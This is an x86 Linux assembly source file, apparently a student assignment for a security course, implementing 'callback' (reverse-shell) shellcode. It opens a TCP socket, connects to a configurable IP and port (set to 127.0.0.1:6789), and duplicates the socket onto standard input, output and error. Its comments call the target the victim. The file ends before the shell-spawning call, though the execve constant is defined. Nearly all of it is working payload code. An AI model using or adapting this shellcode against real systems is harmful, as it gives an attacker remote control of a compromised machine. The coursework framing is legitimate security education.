; nasm -f bin callback.asm

;--------------------------------------------
; Name: 
; Class: CS4678
; Assignment 5
; File: callback.asm
; Last modified: 12 Feb 2012
;---------------------------------------------
;

USE32

SYS_SOCKETCALL equ 0x66
SYS_SOCKET equ 1
SYS_CONNECT equ 3
AF_INET equ 2
SOCK_STREAM equ 1
SYS_DUP2 equ 0x3f
SYS_EXECVE equ 0xb

CALLBACK_PORT equ 0x851a   ; port set to 0x1A85 == 6789
CALLBACK_IP equ 0x0100007f   ; 127.0.0.1  remember byte order!

callback:
      sub      esp, byte 0x30
      xor      eax,eax
      push     eax,
      push     eax
      mov      ebx,CALLBACK_IP  ;ip address
      push     ebx    
      mov      ebx,0x851a0103   ; port and family
      xor      bx,0x0101
      push     ebx
      mov      edi,esp         ; &sockaddr_in
      push     eax  
      push     byte SOCK_STREAM
      push     byte AF_INET
      mov      ecx,esp         ; &socket parms
      mov      al,SYS_SOCKETCALL
      xor      ebx,ebx
      inc      ebx             ; SYS_SOCKET
      int      0x80
      push     byte 0x10       ; sizeof(sockaddr_in)
      push     edi             ; &sockaddr_in
      push     eax             ; sockfd
      mov      ecx,esp         ; &connect parms
      mov      bl,SYS_CONNECT
      mov      al,SYS_SOCKETCALL
      int      0x80
      pop      ebx
      xor      ecx,ecx
      mov      cl,0x03
dup2_loop:
      xor      eax,eax
      mov      al,SYS_DUP2
      dec      ecx
      int      0x80
      inc      ecx
      loop     dup2_loop

;at this point the victim has called us back and dup'ed the socket
;onto stdin, stdout, stderr 

